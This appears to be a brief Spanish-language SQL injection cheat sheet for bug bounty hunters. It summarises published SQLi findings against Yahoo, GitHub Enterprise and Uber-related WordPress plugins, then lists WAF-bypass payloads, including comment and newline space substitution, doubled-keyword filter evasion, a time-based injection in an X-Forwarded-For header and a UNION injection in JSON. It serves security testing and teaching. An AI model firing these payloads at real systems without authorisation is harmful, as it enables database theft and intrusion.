# SQL Injection Cheat Sheet & Bug Bounty Case Studies

## 1. Case Studies de Bug Bounty (`ngalongc/bug-bounty-reference`)

- **Yahoo Root Access SQLi (tw.yahoo.com)**: *Brett Buerhaus* - SQLi en un parámetro sin sanitizar que permitió volcado completo de la base de datos de producción y elevación a Remote Code Execution con privilegios de Root.
- **GitHub Enterprise SQLi**: *Orange Tsai* - Inyección SQL descubierta en el core de la aplicación GitHub Enterprise que permitió omisión de autenticación y ejecución arbitraria.
- **Uber WordPress Plugin SQLi**: *Orange Tsai & Abood Nour* - Inyecciones SQL presentes en plugins de WordPress integrados en dominios secundarios como `sctrack.email.uber.com.cn` y `drive.uber.com`.

## 2. Payloads de Bypass de WAF para SQLi

### Sustitución de Espacios
- `SELECT/**/username/**/FROM/**/users`
- `SELECT%0Ausername%0AFROM%0Ausers`

### Manipulación de Caracteres y Encoding
- `UNUNIONION SELESELECTCT` (Bypass de filtros ingenuos de reemplazo único)
- Inyección en encabezados HTTP: `X-Forwarded-For: 127.0.0.1' AND SLEEP(5)--`
- Inyección en objetos JSON: `{"id": "1' UNION SELECT 1, @@version, 3-- "}`
